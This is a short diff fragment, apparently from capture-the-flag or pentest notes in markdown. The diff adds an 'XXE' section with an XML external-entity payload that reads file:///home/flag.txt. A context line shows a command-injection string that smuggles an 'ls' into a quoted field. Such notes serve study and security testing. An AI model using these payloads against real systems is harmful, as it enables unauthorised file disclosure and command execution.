@@ -270,3 +270,13 @@ e dbg.profile=profile.rr2
 ```
 "; echo $(ls) #
 ```
+
+#### XXE
+
+```
+<!DOCTYPE XXE_TEST [<!ENTITY xxe SYSTEM "file:///home/flag.txt" >]>
+<root>
+<flagread>&xxe;</flagread>
+</root>
+```
+
